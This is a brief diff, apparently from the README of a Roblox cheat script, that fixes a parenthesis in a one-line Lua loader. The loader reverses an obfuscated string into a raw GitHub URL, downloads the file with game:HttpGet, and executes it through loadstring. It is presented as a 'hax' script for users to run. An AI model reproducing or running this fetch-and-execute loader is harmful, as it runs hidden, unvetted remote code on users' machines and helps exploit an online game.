@@ -10,5 +10,5 @@ What is bro yapping about
 
 Loading the hackerman op sckipt hax
 ```lua
-return(0x0133==(z)or(loadstring(game:HttpGet(string.reverse"aul.yna/niaM/niam/sdaeh/sfer/buHkrowteN/392neziten/moc.tnetnocresubuhtig.war//:sptth"))(),"Made by netizen293")
+return(0x0133==(z)or(loadstring(game:HttpGet(string.reverse"aul.yna/niaM/niam/sdaeh/sfer/buHkrowteN/392neziten/moc.tnetnocresubuhtig.war//:sptth"))(),"Made by netizen293"))
 ```
